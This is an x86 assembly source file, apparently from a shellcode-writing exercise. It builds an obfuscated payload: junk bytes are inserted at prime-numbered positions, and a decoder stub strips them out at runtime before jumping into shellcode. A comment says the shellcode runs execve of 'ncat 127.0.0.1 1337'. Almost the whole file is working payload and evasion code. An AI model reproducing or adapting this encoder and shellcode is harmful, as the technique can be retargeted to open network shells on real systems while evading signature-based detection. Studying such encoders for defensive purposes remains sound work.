; Author: @bugsam
; Date: 07/23/2020

global _start

section .text

_start:
	jmp short caller
	
IsPrime:
        push ebp
        mov ebp, esp
	
        mov esi, 0x01           ; (ESI) -> range from 1 to NUMBER
	mov cl, [esp+8]		; (ECX) -> loop counter
	xor eax, eax		; clear register
	xor edi, edi		; clear register
	
        ..@loopPrime:
                xor ebx, ebx	; clear register
                xor edx, edx	; clear register
                mov ax, [esp+8]	; AX -> suppose prime number (dividend)
                div si          ; SI -> range NUMBER (divisor)
                cmp dl, dh      ; check if remainder is ZERO 
                setz bl		; set if remainder is ZERO
                add edi, ebx 	; [EDI] -> number of operations with ZERO remainder
                inc si          ; next divisor
		
                loop ..@loopPrime
		
                cmp edi, 0x02	; greater than 0x02 is compositive number
		cmovg ebx, edx	; returns as a compositive number
		cmovz ebx, [esp+8] ; returns as a prime number
		
                leave
                ret

decoder:
        pop esi			; (ESI) -> memory address for first byte of shellcode
	push esi		; (ESI) -> saves register
	
	xor ebx, ebx
	
        mov cl, 0x5b		; (ECX) -> loop counter, shellcode size, exclude first byte
        mov bl, 0x02		; (EBX) -> processor register to interact with each byte of shellcode
	..@loopDecoder:
		push ecx		; [ESP+4] -> saves counter
		push ebx		; [ESP] -> interact with a BYTE
		
		call IsPrime		; verify if BYTE is prime
					; returns 0x00 -> compositive number
					; returns BYTE <> 0 -> the prime number
		cmp ebx, edx		; (EBX) -> verify if is a compositive number
		jz ..@return
		
		mov cl, 0x5b		; (ECX) -> counter
		sub ecx, ebx		; decrease counter to number of residual bytes
					
		mov edx, [esp+8]	; (EDX) -> memory address of shellcode
		
		lea edi, [edx]		; (EDI) -> destination byte
		add edi, ebx		; (EDI) -> adjusts loop interaction
		mov esi, edi		; (EDI) -> source byte
		add esi, 0x01		; (EDI) -> gets next byte
		
		cld			; increment index of ESI|EDI
		rep movsb		; replace byte with next byte
		mov byte[edi], cl	; clear last byte
		
		..@return:
		pop ebx			; (EBX) -> restore register
		inc ebx			; (EBX) -> interact with next BYTE
		pop ecx			; (ECX) -> restore register
		loop ..@loopDecoder 	; (ECX) -> counter is decreased
		
		jmp shellcode

caller:
        call decoder
; 72 bytes 0x48 (before insertion)
; 92 bytes 0x5c (after insertion) 
; execve ncat 127.0.0.1 1337
shellcode: db 0x31,0xc0,0xff,0x50,0xff,0x68,0x31,0xff,0x33,0x33,0xff,0x37,0x89,0xe2,0x50,0xff,0x68,0x30,0xff,0x2e,0x30,0x31,0x68,0xff,0x30,0x30,0xff,0x2e,0x30,0x68,0x31,0xff,0x32,0x37,0x2e,0x89,0xe1,0x50,0xff,0x68,0x6e,0xff,0x63,0x61,0x74,0x89,0xe3,0x50,0xff,0x89,0xe0,0x52,0x89,0xff,0xc2,0x51,0xff,0x53,0x89,0xe1,0x31,0xff,0xc0,0x50,0x68,0x6e,0x2f,0x6e,0xff,0x63,0x68,0x72,0x2f,0x62,0x69,0xff,0x68,0x2f,0xff,0x2f,0x75,0x73,0x89,0xe3,0x31,0xff,0xc0,0xb0,0x0b,0xcd,0xff,0x80
